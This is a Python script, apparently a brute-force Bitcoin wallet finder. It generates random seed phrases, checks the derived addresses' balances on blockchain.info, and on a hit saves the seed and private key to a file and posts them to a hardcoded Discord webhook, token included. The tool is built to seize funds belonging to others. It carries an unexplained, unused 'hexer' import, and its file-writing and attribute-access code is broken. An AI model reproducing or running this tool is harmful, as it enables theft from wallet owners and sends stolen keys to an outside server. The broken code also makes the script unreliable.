from hdwallet import HDWallet
from hdwallet.symbols import BTC as SYMBOL
from colorama import Fore , Style , Back
from hexer import mHash
from datetime import datetime
import threading
import mnemonic
import requests
from multiprocessing import Pool
import multiprocessing
import os

def message(title, message):
    embered = { 'title': message }
    headers = { "Content-Type": "application/json" }
    data = {'username': 'doge-scan-bot', 'avatar_url': 'https://i.imgur.com/AfFp7pu.png', 'content': str(title), 'embeds': [embered]}
    webhook_url = "https://discord.com/api/webhooks/1227910695769870446/HZIb6qMoD8V3Fu8RMCsMwLp8MnGouLuVveDKA2eA1tNPUMWU-itneoAayVXFcC3EVlwK"
    requests.post(webhook_url, json=data, headers=headers)

def timer() :
    tcx = datetime.now().time()
    return tcx

def generate_mnemonic():
    mnemo = mnemonic.Mnemonic("english")
    return mnemo.generate(strength=128)

def get_balance(wallets):
    try:
        addresses = '|'.join(wallet['address'] for wallet in wallets)
        response = requests.get(f"https://blockchain.info/balance?active={addresses}")
        response.raise_for_status()
        data = response.json()
        return  {key: (value["final_balance"] / 100000000)  for key, value in data.items()}
    except Exception as error:
        # print('Error: ', error)
        return {}

print('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~(MALPHITE CODING)~~~~~~~~~~~~~~~~~~~~~~~~~~\n')

r = 1
cores = os.cpu_count()
threads = 50

print(f"Start With: {cores} CPU Threads \n")


def generate_wallets():
    wallets = []
    for r in range(threads):
        seed = generate_mnemonic()
        hdwallet: HDWallet = HDWallet(symbol = SYMBOL)
        hdwallet.from_mnemonic(mnemonic = seed)
        priv = hdwallet.private_key()

        addr1 = hdwallet.p2wsh_address()
        addr2 = hdwallet.p2pkh_address()
        addr3 = hdwallet.p2wpkh_address()
        addr4 = hdwallet.p2sh_address()

        # Append the dictionary to the wallet list
        wallets.append({
            "seed": seed,
            "address": addr1,
            "private_key": priv
        })
        wallets.append({
            "seed": seed,
            "address": addr2,
            "private_key": priv
        })
        wallets.append({
            "seed": seed,
            "address": addr3,
            "private_key": priv
        })
        wallets.append({
            "seed": seed,
            "address": addr4,
            "private_key": priv
        })

    return wallets

def seek(i) :
    z = 0
    w = 0

    while True :
        txx = timer()
        wallets = generate_wallets()
        balances = get_balance(wallets)
        z += len(wallets) * cores

        for addr, balance in balances.items():
            if (i == 3):
                print(Fore.GREEN , f"Total:" , Fore.YELLOW , str(z) , Fore.GREEN , 'Win:' , Fore.WHITE , str(w) , Fore.RED ,
                        str(addr) + ' [' + str(balance) +' BTC]' , Fore.WHITE , Style.RESET_ALL ,
                        end = '\r')

            if balance > 0:
                w += 1
                ck = next((wallet for wallet in wallets if wallet.get("address") == addr), None)
                print(Fore.WHITE , 'Winning Wallet On Database File Imported ... [LOADED]')
                print(Fore.CYAN , 'All Details Saved On Text File Root Path ... [WRITED]')
                f = open("winner.txt" , "a")
                f.write('\n' , str(ck.address))
                f.write('\n' , str(ck.seed))
                f.write('\n' , str(ck.private_key))
                f.write('\n' , str(balance) + ' BTC')
                f.write('\n==========[PROGRAMMER BY MALPHITE]==========\n')
                f.close()
                print(Fore.MAGENTA , 'Information File Name ========> winner.txt [OK]')
                message('NEW BTC WALLET IS FOUND!', f"[{balance} BTC] \n Address: [{ck.address}] \n Seed: [{ck.seed}] \n Private: [{ck.private_key}]")
                continue

if __name__ == '__main__':
    for i in range(cores):
        p = multiprocessing.Process(target=seek, args=(i,))
        p.start()
